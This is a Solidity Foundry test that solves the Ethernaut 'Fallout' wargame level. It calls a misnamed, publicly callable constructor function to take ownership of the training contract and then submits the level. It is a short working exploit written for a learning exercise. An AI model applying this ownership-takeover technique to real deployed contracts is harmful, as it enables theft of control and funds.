pragma solidity ^0.8.10;

// dependencies
import "@std/Test.sol";

// contracts
import "../src/Fallout/FalloutFactory.sol";
import "../src/Ethernaut.sol";

contract FalloutTest is Test {
    address alice = address(0x1337);

    Ethernaut ethernaut;
    Fallout ethernautFallout;

    function setUp() public {
        vm.label(alice, "Alice");
        vm.label(address(this), "FalloutTest");
        vm.startPrank(alice);

        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        ethernautFallout = Fallout(payable(levelAddress));

        vm.label(address(ethernautFallout), "EthernautFallout");
        vm.deal(alice, 5 ether);
    }

    function testExploit() public {
        ethernautFallout.Fal1out();

        assertEq(ethernautFallout.owner(), alice);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(address(ethernautFallout)));

        vm.stopPrank();

        assert(levelSuccessfullyPassed);
    }

}